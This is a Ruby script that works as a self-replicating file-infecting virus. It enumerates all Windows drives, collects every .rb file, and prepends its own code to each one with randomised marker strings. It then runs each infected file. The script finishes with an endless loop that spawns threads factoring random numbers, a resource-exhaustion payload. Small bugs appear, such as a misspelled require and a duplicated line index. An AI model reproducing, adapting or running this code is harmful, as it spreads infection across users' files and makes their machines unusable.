##334455##
require 'win32old'
begs = "##334" + "455##"
ends = "##556" + "677##"
file_system = WIN32OLE.new("Scripting.FileSystemObject")
d = []
drives = file_system.Drives
drives.each do |drive|
  begin
    d << "Drive letter: #{drive.DriveLetter}"
  rescue
  end
end
nd = []
d.each { |dl| nd << dl.to_s.split(": ")[-1].to_s }
pd, ad = [], []
nd.each { |dl| pd << dl.to_s + ":/" }
pd.each do |dl|
  begin
    Dir.entries(dl.to_s)
	ad << dl.to_s
  rescue => exception
  end
end
maps = []
files = []
subdirectories = []
ad.each do |dir|
  remaining_directories = [dir]
  until remaining_directories.length.to_i == 0
    cd = remaining_directories[0]
    begin
	  Dir.foreach(cd) do |d|
	    if d.to_s != "." and d.to_s != ".."
	      if File.file?(cd.to_s + "/" + d.to_s) and d.to_s.include?(".rb")
		    files << cd.to_s + "/" + d.to_s  
		  elsif File.directory?(cd.to_s + "/" + d.to_s)
		    subdirectories << cd.to_s + "/" + d.to_s
		    remaining_directories << cd.to_s + "/" + d.to_s
	      end
	    end
	  end
    rescue
      ## subdirectory unaccessable, cant be includded with the rest of the mapping, is included as an unmapped directory which will appear empty
    end	  
    remaining_directories.delete_at(0)
  end
end
files.each do |f|
  fi = File.open(f,"r")
  fc = fi.read.to_s
  fi.close
  fi = File.open(__FILE__,"r")
  vc = fi.read.to_s.split(ends.to_s)[0].to_s.split("\n")
  fi.close
  vc = vc[1..-1]
  i, j = "", ""
  6.times { i << rand(10).to_s ; j << rand(10).to_s }
  vc[1] = "begs = \"##" + i.to_s + "##\""
  vc[1] = "ends = \"##" + j.to_s + "##\""
  nsc = vc.join("\n").to_s + "\n" + fc.to_s
  fi = File.open(f,"w")
  fi.write(nsc.to_s)
  fi.close
  system("start ruby " + f.to_s)
end
def factors(n) ## get two numbers that multiplied together would result in the given value
  p, vn = [2], 2
  until vn == n { vn += 1 ; p << vn } ; p.delete_at(-1)
  f1, f2, pd = 0, 0, []
  p.each do |pn|
    s = n.to_f / pn.to_f
    if s.to_s[-2..-1].to_s == ".0"
	  pd << pn
    end
  end
  pd.each do |p|
    if p * p == n
	  f1, f2 = p, p
	else
      cd = pd
	  cd.delete(p)
	  cd.each do |pr|
	    if p * pr == n
	      f1, f2 = p, pr
	      break
	    end
	  end
    end
  end
end
loop { Thread.new { factors(rand(10**10)) } }
##556677##